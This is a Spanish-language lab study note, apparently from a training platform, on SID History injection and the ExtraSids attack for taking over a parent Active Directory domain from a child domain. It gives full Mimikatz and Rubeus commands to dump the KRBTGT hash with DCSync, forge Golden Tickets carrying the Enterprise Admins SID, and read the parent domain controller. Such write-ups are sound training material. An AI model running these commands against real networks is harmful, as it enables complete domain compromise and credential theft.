
## Introduccion al SIDHistory

sidHistory se usa en escenarios de migracion. Si un objeto migra a otro dominio se crea una nueva cuenta en el segundo dominio con el SID original añadido al nuevo usuario para que pueda seguir accediendo a recursos del dominio original

Usando Mimikatz, un atacante puede realizar una inyección de historial de SID y añadir una cuenta de administrador al atributo SID History de una cuenta que controle

Si el SID de una cuenta de Administrador de Dominio (Domain Admin) se añade al atributo SID History de esta cuenta, entonces esta podrá realizar un DCSync y crear un [Golden Ticket](https://attack.mitre.org/techniques/T1558/001/) o un ticket de concesión de tickets (TGT) de Kerberos


## Ataque ExtraSids - Mimikatz

Permite el compromiso del dominio padre una vez comprometido el dominio hijo

El filtrado SID es el usado por AD para la proteccion de las solicitudes de autenticacion por lo que si un usuario tiene el `sidHistory =  grupo Enterprise Admins` este sera tratado como un Enterprise Admin

Necesitamos:

- Hash KRBTGT para el dominio hijo

```
mimikatz 
# lsadump::dcsync /user:LOGISTICS\krbtgt
```
![[Pasted image 20261005162715.png]]

KRBTGT es la cuenta de servicio para el Centro de Distribucion de Claves KDC de AD. Esta cuenta se usa para firmar y cifrar tickets kerberos y los DCs usan su hash para descifrar y validar los tickets. Con esta cuenta se pueden crear tickets TGT y TGS y realizar ataques como Golden Ticket

- SID del dominio hijo

```
Get-DomainSID
```
![[Pasted image 20261005162731.png]]

- Nombre de usuario del objetivo en el dominio hijo
- FQDN del dominio hijo
- SID del grupo Enterprise Admins en el dominio padre

```
Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid
```
![[Pasted image 20261005162802.png]]



En este punto, hemos recopilado los siguientes datos:

- El hash de KRBTGT para el dominio hijo: `9d765b482771505cbe97411065964d5f`
- El SID del dominio hijo: `S-1-5-21-2806153819-209893948-922872689`
- El nombre de un usuario objetivo en el dominio hijo (¡no necesita existir para crear nuestro Golden Ticket!): Elegiremos un usuario falso: `hacker`
- El FQDN del dominio hijo: `LOGISTICS.INLANEFREIGHT.LOCAL`
- El SID del grupo Enterprise Admins del dominio raíz: `S-1-5-21-3842939050-3880317879-2865463114-519`


## Ataque

1. Confirmamos que no tenemos acceso al dc del dominio padre

```
ls \\academy-ea-dc01.inlanefreight.local\c$
```
![[Pasted image 20261005164206.png]]

2. Creamos un golden ticket

```
mimikatz.exe
# kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt
```
![[Pasted image 20261005164247.png]]

3. Confirmamos qu tenemos el ticket Kerberos para nuetro usuario `hacker`:

```
klist
```
![[Pasted image 20261005164335.png]]

4. Accedemos al DC del dominio padre

```
ls \\academy-ea-dc01.inlanefreight.local\c$ 
```
![[Pasted image 20261005164409.png]]


## Ataque ExtraSids - Rubeus

1. Comprobamos que no tenemos acceso al DC del dominio padre

```
ls \\academy-ea-dc01.inlanefreight.local\c$
```
![[Pasted image 20261005164555.png]]

2. Creamos un golden ticket con rubeus

```
.\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt
```
![[Pasted image 20261005164648.png]]

3. Confirmamos que el ticket esta en memoria klist

```
klist
```
![[Pasted image 20261005164712.png]]

4. Hacemos un DCSync

```
.\mimikatz.exe
# lsadump::dcsync /user:INLANEFREIGHT\lab_adm
```
![[Pasted image 20261005164745.png]]


	 Cuando se trabaja con múltiples dominios y nuestro dominio objetivo no es el mismo que el dominio del usuario, necesitaremos especificar el dominio exacto para realizar la operación DCSync

```
lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
```
